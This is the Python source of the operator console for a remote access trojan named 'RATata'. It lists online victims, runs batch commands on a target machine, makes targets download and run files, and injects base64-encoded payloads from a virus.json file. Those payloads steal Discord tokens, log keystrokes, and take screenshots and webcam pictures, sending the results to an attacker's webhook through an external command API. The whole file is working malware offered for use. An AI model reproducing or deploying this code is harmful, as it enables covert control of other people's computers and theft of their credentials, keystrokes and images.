import requests
from urllib.request import Request, urlopen
import os
import time
import base64
import random
import json
import getpass
import ctypes
import shutil
import sys
from colorama import Fore, init
import platform
import subprocess

verion_server = "1.2"
version_client = "1.3"
version_API = "1.1"


path_json = os.path.dirname(os.path.abspath(__file__))

path_url = fr"""{path_json}\json\url.json"""

f = open(path_url,)
data = json.load(f)
url_edit = data["url_edit"]
url_raw = data["url_raw"]
print("[+] Loaded data")
webhook = data["webhook"]

time.sleep(0.2)
oss = platform.system()
if "Windows" in oss:
  os.system("cls")
else:
  os.system("clear")

banner1 = f"""{Fore.RED}
  ██▀███   ▄▄▄     ▄▄▄█████▓ ▄▄▄     ▄▄▄█████▓ ▄▄▄      
 ▓██ ▒ ██▒▒████▄   ▓  ██▒ ▓▒▒████▄   ▓  ██▒ ▓▒▒████▄           
 ▓██ ░▄█ ▒▒██  ▀█▄ ▒ ▓██░ ▒░▒██  ▀█▄ ▒ ▓██░ ▒░▒██  ▀█▄  
 ▒██▀▀█▄  ░██▄▄▄▄██░ ▓██▓ ░ ░██▄▄▄▄██░ ▓██▓ ░ ░██▄▄▄▄██  
 ░██▓ ▒██▒ ▓█   ▓██▒ ▒██▒ ░  ▓█   ▓██▒ ▒██▒ ░  ▓█   ▓██▒
 ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒ ░░    ▒▒   ▓▒█░ ▒ ░░    ▒▒   ▓▒█░
   ░▒ ░ ▒░  ▒   ▒▒ ░   ░      ▒   ▒▒ ░   ░      ▒   ▒▒ ░
   ░░   ░   ░   ▒    ░        ░   ▒    ░        ░   ▒   
    ░           ░  ░              ░  ░              ░  ░{Fore.BLUE}"""

banner2 = f""" [!] By loTus01, [https://github.com/loTus04]{Fore.RESET}"""
# ===================<< HELP MENU START >>===================
help = """
 RATata Commands
 ===============

           Command       Description
           -------       -----------
 [OPTIONS]
          help          Help menu
          banner        Display the RATata banner
          version       Display the curent RATata version
          version info  Display information on each version
          clear         Clear the console
          exit          Exit the console
          stop          Go back to main menu

 [ACTIONS]
          kill          Exit every victims RAT
          ping          Display the online victims
          bash          Execute batch script on the target's machine        
          dwl           Download & run a file
          inject        Run a predefine python malwware on the victime  
          userinfo      Display infomation over a victim
 
 [DEBUG]
          clean         Reset the API data
          log           Opens API logs                                    
"""
# ===================<< HELP MENU END >>===================

# ===================<< VERSION START >>===================
version = f"""
  Server: {verion_server}
  Client: {version_client}
  API: {version_API}
  ---------------  
  RATata by loTus01
  API by Ghostfighter50"""
# ===================<< VERSION END >>===================

# ===================<< VERSION INFO START >>===================
vrinfo = """
 Versions Info [SERVER]
 =======================

     V       Description
     -       -----------
    1.1      + ping, dwl 
    1.2      + inject, pcinfo


 Versions Info [SHELL]
 =======================

     V       Description
     -       -----------
    1.1      + ping, download
    1.2      + run
    1.3      + inject, pcinfo
    1.4      + auto-run, fud
"""
# ===================<< VERSION INFO END >>===================

# ===================<< LOAD START >>===================
def load(resson, sec):
  wait = sec/10
  animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
  print()
  for i in range(len(animation)):
    sys.stdout.write("\r " + animation[i % len(animation)] + f" {resson}")
    time.sleep(wait)
    sys.stdout.flush()
  print()
# ===================<< LOAD END >>===================

# ===================<< CLEAN_UP START >>===================
def cleanup():
  global url_edit
  json = {
    "Title": "",
    "Content": "",
  }
  requests.post(url_edit, data=json)
# ===================<< CLEAN_UP END >>===================

# ===================<< KILL START >>===================
def kill(url_edit):
  json =   {
    "Title": "",
    "Content": "KILL",
  }
  requests.post(url_edit, data=json)
  resson = "Closing all conections"
  sec = 4
  load(resson, sec)
  cleanup()
# ===================<< KILL END >>===================

# ===================<< PING START >>===================
def ping(url_edit, url_raw):
  json =   {
    "Title": "",
    "Content": "P1Ng",
  }
    
  requests.post(url_edit, data=json)

  resson = "Waiting for target to respond..."
  sec = 5

  load(resson, sec)

  ips = urlopen(Request(url_raw)).read().decode()
  cleanup()

  ips = ips.replace('P1Ng', "")
  if ips == "":
    ips = "    [None]         [None]        [None]     [None]"
  print(f"""

 VICTIMES
 ========

      Os             IP           User     CLient V
      --             --           ----     --------""")
  print(ips)
# ===================<< PING END >>===================


# ===================<< EXIT START >>===================
def stop(vari):
  if vari == "stop":
    try:
      start(verion_server, version_client, version_API, url_edit, url_raw, webhook)
    except:
      print("[-] FATAL ERROR")
  else:
    pass
# ===================<< EXIT END >>===================


# ===================<< RUN START >>===================
def run(url_edit, url_raw):
  ip = input(f"\n {Fore.RED}RATata> inject> ip_adress>{Fore.RESET} ")
  vari = ip
  stop(vari)

  link = input(f"\n {Fore.RED}RATata> inject> link>{Fore.RESET} ")
  vari = link
  stop(vari)

  ext = input(f"\n {Fore.RED}RATata> inject> file_name>{Fore.RESET} ")
  vari = ext
  stop(vari)

  data = f"d0wNL04D,{ip},{ext},{link}"
  json =   {
    "Title": "",
    "Content": data,
  }
  requests.post(url_edit, data=json)
  print("\n [!] Waiting for target to download...")
  good =  False
  noww = time.time()
  noww += 5
  while good == False:
    run_r = urlopen(Request(url_raw)).read().decode()
    if "d0wNL04D3D" in run_r:
      good = True
      result = "Downloaded the malware"
      print(f"\n {ip} {result}")

    elif time.time() > noww:
      good = True
      result = "Did not respond"
      print(f"\n {ip} {result}")
    time.sleep(0.5)

  cleanup()
# ===================<< RUN END >>===================

# ===================<< CMD START >>===================
def cmd(url_edit, url_raw):
  ip = input(f"\n {Fore.RED}RATata> command> ip_adress>{Fore.RESET} ")
  vari = ip
  stop(vari)
  print("""
 [?] You can separe commands with a ', ' ex: 'color a, tree' """)
  text = input(f"\n {Fore.RED}RATata> command>{Fore.RESET} ")
  vari = text
  stop(vari)

  data = f"Ex3c{ip}{text}"
  json =   {
    "Title": "",
    "Content": data,
  }
  requests.post(url_edit, data=json)

  print("\n [!] Waiting for target to execute...")
  good =  False
  noww = time.time()
  noww += 10

  while good == False:
    run_r = urlopen(Request(url_raw)).read().decode()
    if "Ex3cUt3D" in run_r:
      good = True
      result = "Excuted the commands"
      print(f"\n {ip} {result}")

    elif time.time() > noww:
      good = True
      result = "Did not respond"
      print(f"\n {ip} {result}")
    time.sleep(0.5)
  cleanup()
# ===================<< CMD END >>===================


# ===================<< INJECT START >>===================
def inject(url_edit, url_raw, webhook):
  ip = input(f"\n {Fore.RED}RATata> inject> ip_adress>{Fore.RESET} ")
  vari = ip
  stop(vari)
  print("""
    Name              Description
    ----              -----------
  tokenGrab       Steal Discord Tokens
  keyLoggeur      Recive KeyStroks
  screenshot      Take a ScreenShot
  webcam          Take a picture with the Webcam

  [!] Be carful, names are case sensitive
  [?] All the information will be send the the webhook in ./json/url.json
  [?] To add a custom payload read the README.md file
  """)
  mlw = input(f"\n {Fore.RED}RATata> inject> malware>{Fore.RESET} ")
  vari = mlw
  stop(vari)

  fail = False
  path_json = os.path.dirname(os.path.abspath(__file__))
  path_ml = fr"""{path_json}\json\virus.json"""
  file1 = open(path_ml)
  import json
  data = json.load(file1)
  
  try:
    scriptA = data[mlw]
  except:
    print(f" [-] Could not get {mlw} from virus.json ")
    fail = True

  if scriptA == "None":
    print(f" [-] The value of {mlw} is null")
    fail = True

  if fail == True:
    start(verion_server, version_client, version_API, url_edit, url_raw, webhook)


    #  scriptA = encode, no webhook // scriptB = decode, webhook // scriptC = encode, webhhok
    # decode malware
  base64_bytes = scriptA.encode('ascii')
  message_bytes = base64.b64decode(base64_bytes)
  scriptB = message_bytes.decode('ascii')
    # add webhook
  scriptB = scriptB.replace("L!Nk123", webhook)
    #recode malware :)
  message_bytes = scriptB.encode('ascii')
  base64_bytes = base64.b64encode(message_bytes)
  scriptC = base64_bytes.decode('ascii')

  data = f"1J3cTe{ip}{scriptC}"
  json =   {
    "Title": "",
    "Content": data,
  }
  requests.post(url_edit, data=json)

  print("\n [!] Waiting for target to execute...")
  good =  False
  noww = time.time()
  noww += 10

  while good == False:
    run_r = urlopen(Request(url_raw)).read().decode()
    if "1J3cTe3D" in run_r:
      good = True
      result = "Excuted the script"
      print(f"\n {ip} {result}")

    elif time.time() > noww:
      good = True
      if mlw == "2":
        result = "is maybe running the keylogger, check the webhook"
      result = "Did not respond"
      print(f"\n {ip} {result}")
    time.sleep(0.5)
  cleanup()

# ===================<< INJECT END >>===================


# ===================<< PC_INFO START >>===================
def pcinfo(url_edit, url_raw):
  ip = input(f"\n {Fore.RED}RATata> pcinfo> ip_adress>{Fore.RESET} ")
  vari = ip
  stop(vari)

  data = f"pC1F0{ip}"
  json =   {
    "Title": "",
    "Content": data,
  }
  requests.post(url_edit, data=json)

  print("\n [!] Waiting for target's informations...")
  good =  False
  noww = time.time()
  noww += 5

  while good == False:
    result = urlopen(Request(url_raw)).read().decode()
    if "pC1F0G00D" in result:
      good = True
      result = result.replace("pC1F0G00D", "")
      print(result)

    elif time.time() > noww:
      good = True
      result = "Did not respond"
      print(f"\n {ip} {result}")
  cleanup()
# ===================<< PC_INFO END >>===================


# on run
print(banner1)
print(banner2)
os.system(f"title RATata {verion_server} By loTus01")
cleanup()

def start(verion_server, version_client, version_API, url_edit, url_raw, webhook):
  while True:
    choix = input(f"\n {Fore.RED}RATata>{Fore.RESET} ")
    cleanup()

    if choix == "ping": ping(url_edit, url_raw)
    elif choix == "dwl": run(url_edit, url_raw)
    elif choix == "clean": cleanup(), print("\n [!] Cleaned API")
    elif choix == "help" or choix == "?": print(help)
    elif choix == "kill": kill(url_edit)
    elif choix == "version": print(version)
    elif choix == "banner": print(banner1), print(banner2)
    elif choix == "bash": cmd(url_edit, url_raw)
    elif choix == "inject": inject(url_edit, url_raw, webhook)
    elif choix == "userinfo": pcinfo(url_edit, url_raw)
    elif choix == "log": 
      path_log = os.path.dirname(os.path.abspath(__file__))
      path_url = fr"""{path_log}\tools\LOG.py"""
      os.startfile(path_url)
    elif choix == "exit": exit()
    elif choix == "cls" or choix == "clear":
      oss = platform.system()
      if "Windows" in oss:
        os.system("cls")
      else:
        os.system("clear")
    elif choix == "version info": print(vrinfo)
    else:
      print("""   [-] Invalid command, use '?' to display the help menu""")

#on ready
start(verion_server, version_client, version_API, url_edit, url_raw, webhook)

